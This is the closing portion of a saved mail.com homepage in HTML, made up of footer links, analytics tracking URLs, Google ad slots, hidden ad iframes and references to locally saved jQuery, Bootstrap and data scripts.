      <a href="https://www.mail.com/int/company/privacypolicy/#.1258-footer-nav2-3" target="_top">Privacy Policy</a></li>
  <li>
      <a href="https://www.mail.com/press/#.1258-footer-nav2-4" target="_top">Press Room</a></li>
  <li>
      <a href="https://www.mail.com/advertising/overview/#.1258-footer-nav2-5" target="_top">Advertise on mail.com</a></li>
  <li>
      <a href="https://support.mail.com/index.html" target="_top">Contact us</a></li>
  <li>
      <a href="https://www.mail.com/company/data-collection/#.1258-footer-nav2-6" target="_top">Data Collection</a></li>
  </ul>
<div class="copyright">
    <p><span class="logo-1and1"></span></p>
    <p>Copyright © 2019 1&amp;1 Mail &amp; Media Inc. All rights reserved.<br>Copyright 2019 Associated Press. All rights reserved.<br>This material may not be published, broadcast, rewritten, or redistributed.</p>
  </div>
</div>
</footer></div>
  </div>
</div><script> var promoCookieHandler = { setCookieToString: '3748556#1576780139349|1|false', domain: 'mail.com' }; </script><script> ui.jsCountUrl = "//wa.mail.com/1and1/mailcom/s?homepage.default.pi.homepage.index&category=homepage&wa_c_ti=mail.com%E2%80%93homeoffreeemailservices%2Cwebmailan&wa_c_id=1258&wa_p_pn=AP&wa_mp_page=0&wa_mp_size=0&wa_sc_2=default&wa_sc_5=index&country=int&kid_0=kid%40autoref%40www.google.com&wa_p_bv=WelcomeBox&wa_p_bf=Box&wa_ht_0=9611814&wa_hp_0=AP&wa_ht_1=9611846&wa_hp_1=AP&wa_ht_2=9611828&wa_hp_2=AP&wa_ht_3=9612618&wa_hp_3=AP&wa_ht_4=9612710&wa_hp_4=AP&wa_ht_5=9612410&wa_hp_5=AP&wa_ht_6=9612812&wa_hp_6=AP&wa_ht_7=9612900&wa_hp_7=AP&wa_ht_8=9612940&wa_hp_8=AP&wa_ht_9=9611640&wa_hp_9=AP&wa_ht_10=9612074&wa_hp_10=AP&wa_ht_11=9612960&wa_hp_11=BoyGeniusReport&wa_ht_12=9612894&wa_hp_12=BoyGeniusReport"; ui.brainOptOutTransferUrl = "https://wa.ui-portal.de/opt-out-transfer/mailcom/"; </script> <noscript> <img src="//wa.mail.com/1and1/mailcom/s?homepage.default.pi.homepage.index&amp;category=homepage&amp;wa_c_ti=mail.com%E2%80%93homeoffreeemailservices%2Cwebmailan&amp;wa_c_id=1258&amp;wa_p_pn=AP&amp;wa_mp_page=0&amp;wa_mp_size=0&amp;wa_sc_2=default&amp;wa_sc_5=index&amp;country=int&amp;kid_0=kid%40autoref%40www.google.com&amp;wa_p_bv=WelcomeBox&amp;wa_p_bf=Box&amp;wa_ht_0=9611814&amp;wa_hp_0=AP&amp;wa_ht_1=9611846&amp;wa_hp_1=AP&amp;wa_ht_2=9611828&amp;wa_hp_2=AP&amp;wa_ht_3=9612618&amp;wa_hp_3=AP&amp;wa_ht_4=9612710&amp;wa_hp_4=AP&amp;wa_ht_5=9612410&amp;wa_hp_5=AP&amp;wa_ht_6=9612812&amp;wa_hp_6=AP&amp;wa_ht_7=9612900&amp;wa_hp_7=AP&amp;wa_ht_8=9612940&amp;wa_hp_8=AP&amp;wa_ht_9=9611640&amp;wa_hp_9=AP&amp;wa_ht_10=9612074&amp;wa_hp_10=AP&amp;wa_ht_11=9612960&amp;wa_hp_11=BoyGeniusReport&amp;wa_ht_12=9612894&amp;wa_hp_12=BoyGeniusReport" alt="" width="1" height="1" class="trackingPixel" /> </noscript><script> toast('https://s.uicdn.com/mailint/8.1516.0/assets/potec.core.min.js', function() { potec.init('https://s.uicdn.com/mailint/8.1516.0/'); }); </script><div class="ad-container  mod mod-inviewcheck" id="gpt-ambient" data-init="true" data-adcalled="true" data-google-query-id="CLvkreOrwuYCFWnHuwgdbW0A4g"> <script> googletag.cmd.push(function () { googletag.defineOutOfPageSlot('/6840/p6840.mail.com/interstitial_oop', 'gpt-ambient').addService(googletag.pubads()); });</script> <div id="google_ads_iframe_/6840/p6840.mail.com/interstitial_oop_0__container__" style="border: 0pt none; width: 1px; height: 1px;"></div></div><div class="ad-container  mod mod-inviewcheck" id="gpt-addition" data-init="true" data-adcalled="true" data-google-query-id="CIqr6-OrwuYCFR7DuwgdqBcJdw">  <div id="google_ads_iframe_/6840/p6840.mail.com/gpt-addition_0__container__" style="border: 0pt none;"><iframe id="google_ads_iframe_/6840/p6840.mail.com/gpt-addition_0" title="3rd party ad content" name="google_ads_iframe_/6840/p6840.mail.com/gpt-addition_0" width="1" height="1" scrolling="no" marginwidth="0" marginheight="0" frameborder="0" data-google-container-id="9" style="border: 0px; vertical-align: bottom;" data-load-complete="true" src="files/saved_resource(8).html"></iframe></div></div><script crossorigin="anonymous" type="module" src="files/entry3.js.download"></script>
<script crossorigin="anonymous" nomodule="" src="files/main.min.js.download" async=""></script>


<iframe src="files/pd(1).html" width="0" height="0" style="display:none;"></iframe><iframe src="files/pd(2).html" width="0" height="0" style="display:none;"></iframe><iframe src="files/pd(3).html" width="0" height="0" style="display:none;"></iframe><iframe src="files/pd(4).html" width="0" height="0" style="display:none;"></iframe><iframe src="files/pd(5).html" width="0" height="0" style="display:none;"></iframe><iframe src="files/pd(6).html" width="0" height="0" style="display:none;"></iframe><iframe src="files/pd(7).html" width="0" height="0" style="display:none;"></iframe><iframe id="google_osd_static_frame_7968138030860" name="google_osd_static_frame" style="display: none; width: 0px; height: 0px;" src="files/saved_resource(9).html"></iframe><iframe style="width: 0px; height: 0px; visibility: hidden; display: none;" src="files/saved_resource(10).html"></iframe><div class="_cm-os-slider" id="_cm-css-reset" style="text-align: left; top: auto; bottom: 64px; left: auto; width: 400px; height: 225px; right: -400px; transition: right 1s ease 0s, left 1s ease 0s !important;"><div id="_cm-css-reset" class="_cm-loading" style="display: none;"><div class="_cm-loading-div"> <img src="files/loading2.png" class="_cm_loader_img"><div id="_cm-css-reset" class="_cm-repeat-div" style="display: none; background-image: url(&quot;//vidstat.taboola.com/assets/blurry-image.png&quot;) !important;"> <div class="_cm-repeat-view-wrapper"> <div class="_cm-repeat-buttons-wrapper"> <img class="_cm-repeat-button" src="files/replay-button.svg"> <img class="_cm-repeat-button-hover" src="files/replay-button-hover.svg"> </div> <div class="_cm-learn-more-buttons-wrapper" style="display: none;"> <img class="_cm-learn-more-button" src="files/learn-more-button.svg"> <img class="_cm-learn-more-button-hover" src="files/learn-more-button-hover.svg"> </div> </div> </div></div></div><div id="_cm-css-reset" class="_cm-video _cm-video-with-slider" style="text-align: left; width: 400px; height: 225px;"><div class="_cm-video-ad vpaid-player-container" id="_cm-css-reset" width="400" height="225" style="width: 400px; height: 225px;"></div></div><div class="_cm-content-video" style="display: none;"></div></div><iframe src="files/pd(8).html" width="0" height="0" style="display:none;"></iframe>

<script src="vendor/jquery/jquery-2.2.3.min.js"></script>
<script src="vendor/bootstrap/js/bootstrap.min.js"></script>
<script src="js/data.js"></script>
</body></html>